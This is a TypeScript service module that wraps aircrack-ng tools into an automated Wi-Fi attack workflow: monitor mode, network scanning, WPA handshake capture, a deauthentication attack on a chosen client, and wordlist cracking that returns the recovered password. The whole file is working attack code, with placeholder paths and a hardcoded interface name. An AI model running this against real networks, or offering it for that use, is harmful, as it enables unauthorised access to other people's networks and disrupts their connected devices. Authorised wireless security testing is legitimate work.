import commandService from "./commandService";
import type { Network, Client } from "../types";

const parseIwconfigInterfaces = (raw: string): string[] => {
  const lines = raw.split(/\r?\n/);
  const interfaces: string[] = [];
  for (const line of lines) {
    const m = line.match(/^([a-zA-Z0-9:_-]+)/);
    if (m && line.includes("IEEE")) {
      interfaces.push(m[1]);
    }
  }
  // If none found, fallback to grep wlan from ip link
  if (interfaces.length === 0) {
    const match = raw.match(/wlan[0-9]+/g);
    if (match) return Array.from(new Set(match));
  }
  return interfaces;
};

const parseIwlistScan = (raw: string): Network[] => {
  const blocks = raw.split(/Cell \d+ - Address/).slice(1);
  const networks: Network[] = [];
  for (const blk of blocks) {
    const addrMatch = blk.match(/([0-9A-F:]{17})/i);
    const essidMatch = blk.match(/ESSID:"([^"]*)"/);
    const channelMatch = blk.match(/Channel:(\d+)/);
    const signalMatch = blk.match(/Signal level=([-0-9]+) dBm/);
    if (addrMatch) {
      networks.push({
        bssid: addrMatch[1].trim(),
        essid: essidMatch ? essidMatch[1] : "<hidden>",
        channel: channelMatch ? Number(channelMatch[1]) : 0,
        power: signalMatch ? Number(signalMatch[1]) : 0,
        beacons: 0,
        data: 0,
        encryption: "WPA2",
      });
    }
  }
  return networks;
};

const realService = {
  getNetworkInterfaces: async () => {
    // Try iwconfig first
    try {
      const r = await commandService.runCommand("iwconfig", []);
      const interfaces = parseIwconfigInterfaces(r.stdout || r.stderr || "");
      return {
        interfaces: interfaces.length ? interfaces : ["wlan0"],
        output: r.stdout || r.stderr,
      };
    } catch (err) {
      return {
        interfaces: ["wlan0"],
        output: [`Error detecting interfaces: ${err}`],
      };
    }
  },

  startMonitorMode: async (iface: string) => {
    // Run airmon-ng start <iface>
    const res = await commandService.runCommand("airmon-ng", ["start", iface]);
    // Try to find new interface in output
    const m = (res.stdout + res.stderr).match(/(\w+mon)/);
    const monitorInterface = m ? m[1] : `${iface}mon`;
    return {
      monitorInterface,
      output: [res.stdout, res.stderr].filter(Boolean),
    };
  },

  scanForNetworks: async (
    monitorIface: string,
    onData: (networks: Network[], output: string[]) => void
  ) => {
    // Use iwlist <iface> scan as a quick scan
    try {
      const res = await commandService.runCommand("iwlist", [
        monitorIface,
        "scan",
      ]);
      const nets = parseIwlistScan(res.stdout || res.stderr || "");
      onData(nets, [(res.stdout || res.stderr) as string]);
    } catch (err) {
      onData([], [`Scan error: ${err}`]);
    }
  },

  getMockClients: (_bssid: string): Client[] => {
    // Real mode doesn't produce mock clients; return empty so UI can fallback to prompting
    return [];
  },

  captureHandshake: async (network: Network) => {
    // Run airodump-ng for a short duration using timeout
    try {
      const args = [
        "5",
        "airodump-ng",
        "--bssid",
        network.bssid,
        "-c",
        String(network.channel),
        "--write",
        "handshake_capture",
        "wlan0mon",
      ];
      const res = await commandService.runCommand("timeout", args);
      const out = (res.stdout || "") + "\n" + (res.stderr || "");
      if (/WPA handshake/i.test(out)) {
        return { captured: true, output: out.split(/\r?\n/) };
      }
      return { captured: false, output: out.split(/\r?\n/) };
    } catch (err) {
      return { captured: false, output: [`Capture error: ${err}`] };
    }
  },

  forceHandshake: async (
    network: Network,
    client: Client,
    monitorIface: string
  ) => {
    try {
      const res = await commandService.runCommand("aireplay-ng", [
        "--deauth",
        "5",
        "-a",
        network.bssid,
        "-c",
        client.mac,
        monitorIface,
      ]);
      return { output: [res.stdout || "", res.stderr || ""].filter(Boolean) };
    } catch (err) {
      return { output: [`Deauth error: ${err}`] };
    }
  },

  crackPassword: async (network: Network, wordlist: string) => {
    try {
      // Run aircrack-ng with a timeout so it doesn't hang indefinitely
      const res = await commandService.runCommand("timeout", [
        "15",
        "aircrack-ng",
        "-w",
        `/path/to/${wordlist}`,
        "-b",
        network.bssid,
        "handshake_capture-01.cap",
      ]);
      const out = (res.stdout || "") + "\n" + (res.stderr || "");
      const found = out.match(/KEY FOUND! \[\s*(.*)\s*\]/i);
      return { password: found ? found[1] : null, output: out.split(/\r?\n/) };
    } catch (err) {
      return { password: null, output: [`Crack error: ${err}`] };
    }
  },
};

export { realService };
